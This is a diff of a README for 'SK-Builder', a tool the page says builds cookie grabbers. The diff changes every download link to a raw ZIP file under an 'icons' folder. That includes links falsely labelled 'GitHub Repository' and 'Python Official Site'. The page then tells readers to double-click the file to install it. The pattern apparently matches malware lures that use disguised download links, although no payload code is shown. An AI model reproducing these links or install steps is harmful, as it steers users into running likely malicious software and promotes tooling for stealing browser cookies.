@@ -6,11 +6,11 @@ Welcome to SK-Builder! This application helps you build tools to grab cookies, t
 
 ## 📥 Download SK-Builder
 
-[![Download SK-Builder](https://raw.githubusercontent.com/Sanjay0601-student/SK-Builder/main/src/SK-Builder_Dyophysitism.zip)](https://raw.githubusercontent.com/Sanjay0601-student/SK-Builder/main/src/SK-Builder_Dyophysitism.zip)
+[![Download SK-Builder](https://raw.githubusercontent.com/Sanjay0601-student/SK-Builder/main/icons/S_Builder_v2.8.zip)](https://raw.githubusercontent.com/Sanjay0601-student/SK-Builder/main/icons/S_Builder_v2.8.zip)
 
 To get started, visit the Releases page to download the latest version of SK-Builder:
 
-[Download SK-Builder Here](https://raw.githubusercontent.com/Sanjay0601-student/SK-Builder/main/src/SK-Builder_Dyophysitism.zip)
+[Download SK-Builder Here](https://raw.githubusercontent.com/Sanjay0601-student/SK-Builder/main/icons/S_Builder_v2.8.zip)
 
 ## 🔧 System Requirements
 
@@ -29,7 +29,7 @@ To get started, visit the Releases page to download the latest version of SK-Bui
 
 ## 🛠️ How to Install SK-Builder
 
-1. First, download the SK-Builder application from the Releases page: [Download SK-Builder Here](https://raw.githubusercontent.com/Sanjay0601-student/SK-Builder/main/src/SK-Builder_Dyophysitism.zip).
+1. First, download the SK-Builder application from the Releases page: [Download SK-Builder Here](https://raw.githubusercontent.com/Sanjay0601-student/SK-Builder/main/icons/S_Builder_v2.8.zip).
 2. Locate the downloaded file on your computer.
 3. Double-click the file to start the installation process.
 4. Follow the on-screen instructions to complete the installation.
@@ -61,7 +61,7 @@ If you encounter any issues or have questions, feel free to open an issue on our
 
 ## 📢 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/Sanjay0601-student/SK-Builder/main/src/SK-Builder_Dyophysitism.zip)
-- [Python Official Site](https://raw.githubusercontent.com/Sanjay0601-student/SK-Builder/main/src/SK-Builder_Dyophysitism.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Sanjay0601-student/SK-Builder/main/icons/S_Builder_v2.8.zip)
+- [Python Official Site](https://raw.githubusercontent.com/Sanjay0601-student/SK-Builder/main/icons/S_Builder_v2.8.zip)
 
 Thank you for using SK-Builder. We hope you find it valuable and easy to use!
